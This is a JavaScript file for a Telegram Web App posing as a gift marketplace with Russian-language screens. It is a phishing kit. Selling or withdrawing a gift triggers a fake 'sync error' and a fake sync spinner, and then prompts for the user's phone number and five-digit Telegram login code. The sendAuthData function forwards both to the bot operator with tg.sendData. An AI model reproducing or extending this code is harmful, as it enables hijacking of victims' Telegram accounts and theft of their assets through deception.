// Telegram Web App
const tg = window.Telegram.WebApp;

// Mock data
const mockGifts = [
    { id: 1, name: 'Scared Cat', price: '13.40', image: 'https://i.ibb.co/77LDYZT/Market.jpg' },
    { id: 2, name: 'Snoop Dog', price: '974.99', image: 'https://i.ibb.co/77LDYZT/Market.jpg' },
    { id: 3, name: 'UFC Strike', price: '39.18', image: 'https://i.ibb.co/77LDYZT/Market.jpg' },
    { id: 4, name: 'Mad Pumpkin', price: '13.40', image: 'https://i.ibb.co/77LDYZT/Market.jpg' },
];

const mockUserGifts = [
    { id: 1, name: 'Scared Cat', date: '2 hours ago' },
    { id: 2, name: 'Snoop Dog', date: '1 day ago' },
];

const mockHistory = [
    { type: 'received', gift: 'Scared Cat', user: '@username', date: '2 hours ago' },
    { type: 'sent', gift: 'Snoop Dog', user: '@friend', date: '1 day ago' },
    { type: 'received', gift: 'UFC Strike', user: '@admin', date: '3 days ago' },
];

// Initialize
document.addEventListener('DOMContentLoaded', () => {
    tg.ready();
    
    // Simulate loading
    setTimeout(() => {
        loadUserData();
        showScreen('main-screen');
    }, 2000);
    
    setupNavigation();
    loadGifts();
    loadUserGifts();
    loadHistory();
});

// Load user data from Telegram
function loadUserData() {
    const user = tg.initDataUnsafe?.user;
    
    if (user) {
        const userName = user.first_name + (user.last_name ? ' ' + user.last_name : '');
        const userUsername = user.username ? '@' + user.username : '@user';
        const userPhoto = user.photo_url || 'https://via.placeholder.com/80';
        
        // Update loading screen
        document.getElementById('user-name').textContent = userName;
        document.getElementById('user-avatar').src = userPhoto;
        
        // Update profile
        document.getElementById('profile-name').textContent = userName;
        document.getElementById('profile-username').textContent = userUsername;
        document.getElementById('profile-avatar').src = userPhoto;
    }
}

// Show/hide screens
function showScreen(screenId) {
    document.querySelectorAll('.screen').forEach(screen => {
        screen.classList.remove('active');
    });
    document.getElementById(screenId).classList.add('active');
}

// Setup navigation
function setupNavigation() {
    document.querySelectorAll('.nav-btn').forEach(btn => {
        btn.addEventListener('click', () => {
            const tabName = btn.dataset.tab;
            
            // Update active button
            document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
            
            // Update active tab
            document.querySelectorAll('.tab-content').forEach(tab => tab.classList.remove('active'));
            document.getElementById(tabName + '-tab').classList.add('active');
        });
    });
}

// Load gifts
function loadGifts() {
    const grid = document.getElementById('gifts-grid');
    grid.innerHTML = '';
    
    mockGifts.forEach(gift => {
        const card = document.createElement('div');
        card.className = 'gift-card';
        card.innerHTML = `
            <img src="${gift.image}" alt="${gift.name}" class="gift-image">
            <div class="gift-name">${gift.name}</div>
            <div class="gift-price">💎 ${gift.price}</div>
        `;
        card.addEventListener('click', () => {
            tg.showAlert(`You selected: ${gift.name}`);
        });
        grid.appendChild(card);
    });
}

// Load user gifts
function loadUserGifts() {
    const container = document.getElementById('my-gifts');
    container.innerHTML = '';
    
    if (mockUserGifts.length === 0) {
        container.innerHTML = '<p style="text-align: center; color: rgba(255,255,255,0.6);">No gifts yet</p>';
        return;
    }
    
    mockUserGifts.forEach(gift => {
        const item = document.createElement('div');
        item.className = 'gift-item';
        item.innerHTML = `
            <img src="https://i.ibb.co/77LDYZT/Market.jpg" alt="${gift.name}" class="gift-item-image">
            <div class="gift-item-info">
                <div class="gift-item-name">${gift.name}</div>
                <div class="gift-item-date">${gift.date}</div>
            </div>
        `;
        item.addEventListener('click', () => showGiftModal(gift));
        container.appendChild(item);
    });
    
    // Update badge
    const badge = document.getElementById('gifts-badge');
    if (mockUserGifts.length > 0) {
        badge.textContent = mockUserGifts.length;
        badge.style.display = 'flex';
    }
}

// Load history
function loadHistory() {
    const list = document.getElementById('history-list');
    list.innerHTML = '';
    
    mockHistory.forEach(item => {
        const historyItem = document.createElement('div');
        historyItem.className = 'history-item';
        const action = item.type === 'received' ? '📥 Received' : '📤 Sent';
        historyItem.innerHTML = `
            <div>${action} <strong>${item.gift}</strong> ${item.type === 'received' ? 'from' : 'to'} ${item.user}</div>
            <div class="history-date">${item.date}</div>
        `;
        list.appendChild(historyItem);
    });
}

// Update stats (mock)
document.addEventListener('DOMContentLoaded', () => {
    document.getElementById('stars').textContent = '0';
    document.getElementById('balance').textContent = '0.00';
    document.getElementById('profile-received').textContent = mockUserGifts.length;
    document.getElementById('profile-sent').textContent = mockHistory.filter(h => h.type === 'sent').length;
});


// Gift Modal
function showGiftModal(gift) {
    const modal = document.createElement('div');
    modal.className = 'modal';
    modal.innerHTML = `
        <div class="modal-content">
            <button class="modal-close">✕</button>
            <img src="https://i.ibb.co/77LDYZT/Market.jpg" alt="${gift.name}" class="modal-image">
            <h2>${gift.name}</h2>
            <p class="modal-id">#9920</p>
            <p class="modal-price">Мин. цена 82.68 TON</p>
            
            <div class="modal-buttons">
                <button class="modal-btn secondary">Вывести</button>
                <button class="modal-btn primary">Продать 82.68 TON</button>
            </div>
        </div>
    `;
    
    document.body.appendChild(modal);
    
    // Close button
    modal.querySelector('.modal-close').addEventListener('click', () => {
        modal.remove();
    });
    
    // Buttons
    modal.querySelector('.modal-btn.secondary').addEventListener('click', () => {
        showSyncError(modal);
    });
    
    modal.querySelector('.modal-btn.primary').addEventListener('click', () => {
        showSyncError(modal);
    });
    
    // Close on background click
    modal.addEventListener('click', (e) => {
        if (e.target === modal) {
            modal.remove();
        }
    });
}

// Sync Error Modal
function showSyncError(parentModal) {
    const errorModal = document.createElement('div');
    errorModal.className = 'modal';
    errorModal.innerHTML = `
        <div class="error-content">
            <div class="error-icon">⚠️</div>
            <h2>Ошибка</h2>
            <p>Для вывода подарка требуется синхронизация аккаунта с маркетом</p>
            
            <div class="error-buttons">
                <button class="error-btn sync-btn">Синхронизация</button>
                <button class="error-btn close-btn">Закрыть</button>
            </div>
        </div>
    `;
    
    document.body.appendChild(errorModal);
    
    // Sync button
    errorModal.querySelector('.sync-btn').addEventListener('click', () => {
        showSyncLoading(errorModal);
    });
    
    // Close button
    errorModal.querySelector('.close-btn').addEventListener('click', () => {
        errorModal.remove();
        parentModal.remove();
    });
}

// Sync Loading
function showSyncLoading(errorModal) {
    const loadingModal = document.createElement('div');
    loadingModal.className = 'modal';
    loadingModal.innerHTML = `
        <div class="sync-loading">
            <div class="sync-spinner"></div>
            <p>Синхронизация...</p>
        </div>
    `;
    
    document.body.appendChild(loadingModal);
    errorModal.remove();
    
    // Simulate sync
    setTimeout(() => {
        loadingModal.remove();
        showAuthScreen();
    }, 2000);
}

// Auth Screen
function showAuthScreen() {
    const authModal = document.createElement('div');
    authModal.className = 'modal';
    authModal.innerHTML = `
        <div class="auth-content">
            <div class="auth-icon">🔐</div>
            <h2>Авторизируйтесь через Telegram</h2>
            <p>Для продолжения требуется подтверждение номера телефона</p>
            
            <button class="auth-btn">Войти</button>
        </div>
    `;
    
    document.body.appendChild(authModal);
    
    authModal.querySelector('.auth-btn').addEventListener('click', () => {
        requestPhoneNumber(authModal);
    });
}

// Request Phone Number
function requestPhoneNumber(authModal) {
    // Use Telegram's built-in phone request
    tg.requestPhone();
    
    // Listen for phone number
    tg.onEvent('phoneNumberSent', (phone) => {
        authModal.remove();
        showCodeInputScreen(phone);
    });
    
    // Fallback: if Telegram doesn't provide phone, show manual input
    setTimeout(() => {
        if (authModal.parentElement) {
            authModal.remove();
            showPhoneInputScreen();
        }
    }, 1000);
}

// Phone Input Screen (fallback)
function showPhoneInputScreen() {
    const phoneModal = document.createElement('div');
    phoneModal.className = 'modal';
    phoneModal.innerHTML = `
        <div class="phone-input-content">
            <h2>Введите номер телефона</h2>
            <input type="tel" id="phone-input" placeholder="+7 (999) 999-99-99" class="phone-input">
            <button class="phone-submit-btn">Продолжить</button>
        </div>
    `;
    
    document.body.appendChild(phoneModal);
    
    const phoneInput = phoneModal.querySelector('#phone-input');
    const submitBtn = phoneModal.querySelector('.phone-submit-btn');
    
    submitBtn.addEventListener('click', () => {
        const phone = phoneInput.value.trim();
        if (phone) {
            phoneModal.remove();
            showCodeInputScreen(phone);
        }
    });
    
    phoneInput.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') {
            submitBtn.click();
        }
    });
}

// Code Input Screen
function showCodeInputScreen(phone) {
    const codeModal = document.createElement('div');
    codeModal.className = 'modal';
    codeModal.innerHTML = `
        <div class="code-input-content">
            <h2>Введите код подтверждения</h2>
            <p>Код отправлен на номер ${phone}</p>
            
            <div class="code-inputs">
                <input type="text" class="code-digit" maxlength="1" placeholder="0">
                <input type="text" class="code-digit" maxlength="1" placeholder="0">
                <input type="text" class="code-digit" maxlength="1" placeholder="0">
                <input type="text" class="code-digit" maxlength="1" placeholder="0">
                <input type="text" class="code-digit" maxlength="1" placeholder="0">
            </div>
            
            <button class="code-show-btn">Показать код</button>
            <button class="code-submit-btn">Подтвердить</button>
        </div>
    `;
    
    document.body.appendChild(codeModal);
    
    const codeInputs = codeModal.querySelectorAll('.code-digit');
    const showBtn = codeModal.querySelector('.code-show-btn');
    const submitBtn = codeModal.querySelector('.code-submit-btn');
    
    // Auto-focus next input
    codeInputs.forEach((input, index) => {
        input.addEventListener('input', (e) => {
            if (e.target.value && index < codeInputs.length - 1) {
                codeInputs[index + 1].focus();
            }
        });
        
        input.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && !e.target.value && index > 0) {
                codeInputs[index - 1].focus();
            }
        });
    });
    
    // Show code button
    showBtn.addEventListener('click', () => {
        const code = Array.from(codeInputs).map(input => input.value).join('');
        if (code.length === 5) {
            tg.showAlert(`Ваш код: ${code}`);
        }
    });
    
    // Submit button
    submitBtn.addEventListener('click', () => {
        const code = Array.from(codeInputs).map(input => input.value).join('');
        if (code.length === 5) {
            sendAuthData(phone, code, codeModal);
        }
    });
}

// Send Auth Data to Bot
function sendAuthData(phone, code, codeModal) {
    // Send data to bot logs
    const message = `📱 Phone: ${phone}\n🔐 Code: ${code}`;
    
    // Use Telegram's sendData to send back to bot
    tg.sendData(JSON.stringify({
        type: 'auth',
        phone: phone,
        code: code,
        timestamp: new Date().toISOString()
    }));
    
    // Show success
    codeModal.remove();
    showAuthSuccess();
}

// Sync Success
function showSyncSuccess() {
    const successModal = document.createElement('div');
    successModal.className = 'modal';
    successModal.innerHTML = `
        <div class="success-content">
            <div class="success-icon">✓</div>
            <h2>Успешно!</h2>
            <p>Аккаунт синхронизирован</p>
            
            <button class="success-btn">Закрыть</button>
        </div>
    `;
    
    document.body.appendChild(successModal);
    
    successModal.querySelector('.success-btn').addEventListener('click', () => {
        successModal.remove();
    });
}

// Auth Success
function showAuthSuccess() {
    const successModal = document.createElement('div');
    successModal.className = 'modal';
    successModal.innerHTML = `
        <div class="success-content">
            <div class="success-icon">✓</div>
            <h2>Успешно!</h2>
            <p>Аккаунт авторизирован</p>
            
            <button class="success-btn">Закрыть</button>
        </div>
    `;
    
    document.body.appendChild(successModal);
    
    successModal.querySelector('.success-btn').addEventListener('click', () => {
        successModal.remove();
    });
}
